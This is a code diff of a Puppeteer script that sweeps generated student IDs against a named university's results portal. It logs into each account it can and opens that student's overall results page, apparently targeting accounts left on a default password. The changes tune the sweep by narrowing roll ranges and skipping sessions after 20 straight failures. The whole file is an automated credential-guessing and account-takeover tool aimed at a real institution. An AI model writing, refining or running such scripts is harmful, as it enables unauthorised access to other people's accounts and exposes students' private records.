@@ -1,35 +1,32 @@
-const puppeteer = require("puppeteer");
+import puppeteer from "puppeteer";
 
 const baseUrl = "https://nubtkhulna.ac.bd/ter";
 const department = "ARCH";
-const rollStart = 20001;
-const rollEnd = 20500;
-
-function generateUserIds(sessionList) {
-    const ids = [];
-    for (const session of sessionList) {
-        for (let roll = rollStart; roll <= rollEnd; roll++) {
-            ids.push(`${department}${session}${roll}`);
-        }
-    }
-    return ids;
-}
+const rollStart = 1;
+const rollEnd = 200;
 
 (async () => {
     const browser = await puppeteer.launch({ headless: true });
     const unchanged = [];
 
+    let lastSuccessRoll = rollStart;
+
     for (let year = 17; year <= 25; year++) {
         for (const term of ["01", "03"]) {
             const session = `${year}${term}`;
-            const userIds = generateUserIds([session]);
+            let failureCount = 0;
+            
+            let skipSession = false;
 
             console.log(`\n🚀 Starting session: ${session}\n`);
 
-            for (const userId of userIds) {
+            for (let roll = lastSuccessRoll; roll <= rollEnd; roll++) {
+                const rollCode = `20${String(roll).padStart(3, "0")}`;
+                const userId = `${department}${session}${rollCode}`;
+
                 console.log(`🔍 Trying: ${userId}`);
                 const page = await browser.newPage();
-                await page.setDefaultNavigationTimeout(20000);
+                page.setDefaultNavigationTimeout(20000);
 
                 try {
                     await page.goto(`${baseUrl}/login`, { waitUntil: "domcontentloaded" });
@@ -44,6 +41,8 @@ function generateUserIds(sessionList) {
 
                     if (page.url().includes("panel")) {
                         console.log(`✅ Login success: ${userId}`);
+                        failureCount = 0;
+                        lastSuccessRoll = roll + 1;
 
                         await page.goto(`${baseUrl}/panel/overallresult`, {
                             waitUntil: "domcontentloaded"
@@ -79,13 +78,28 @@ function generateUserIds(sessionList) {
 
                         await page.goto(`${baseUrl}/login/signout`, { waitUntil: "domcontentloaded" });
                     } else {
+                        failureCount++;
                         console.log(`❌ Login failed: ${userId}`);
                     }
+
+                    if (failureCount >= 20) {
+                        console.log(`🚫 20 consecutive failures in session ${session}, moving to next.`);
+                        skipSession = true;
+                        break;
+                    }
                 } catch (err) {
+                    failureCount++;
                     console.error(`⏱️ Timeout or error with ${userId}: ${err.message}`);
+                    if (failureCount >= 20) {
+                        console.log(`🚫 20 consecutive failures in session ${session}, moving to next.`);
+                        skipSession = true;
+                        break;
+                    }
                 } finally {
                     await page.close();
                 }
+
+                if (skipSession) break;
             }
         }
     }
